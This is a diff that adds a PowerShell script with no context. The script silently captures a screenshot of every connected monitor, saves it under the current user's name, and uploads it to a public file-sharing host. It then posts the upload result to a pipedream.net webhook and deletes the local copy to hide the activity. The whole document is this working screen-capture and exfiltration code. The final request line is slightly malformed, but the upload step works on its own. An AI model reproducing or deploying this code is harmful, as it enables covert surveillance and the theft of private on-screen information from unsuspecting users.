@@ -1,0 +1,34 @@
+ Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+
+$screens = [Windows.Forms.Screen]::AllScreens
+
+$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
+$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
+$right  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
+$bottom = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
+
+$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
+$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
+$graphics = [Drawing.Graphics]::FromImage($bmp)
+ 
+$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+
+$Scale = 31
+
+
+[int32]$new_width = $bounds.Width * ($Scale / 100)
+[int32]$new_height = $bounds.Height * ($Scale / 100)
+
+$img2 = New-Object System.Drawing.Bitmap($new_width, $new_height)
+$graph = [System.Drawing.Graphics]::FromImage($img2)
+$graph.DrawImage($bmp, 0, 0, $new_width, $new_height)
+
+
+$img2.Save("C:\Cache\$env:username.png")
+
+$graphics.Dispose()
+$bmp.Dispose()
+
+$hi = cmd /c curl -X POST 'https://store1.gofile.io/contents/uploadfile' -F "file=@$env:username.png"
+curl https://eov3z188nwj4lcz.m.pipedream.net/screenshot/$env:username" -Body $hi -method post
+Remove-Item "c:\Cache\$env:username.png"
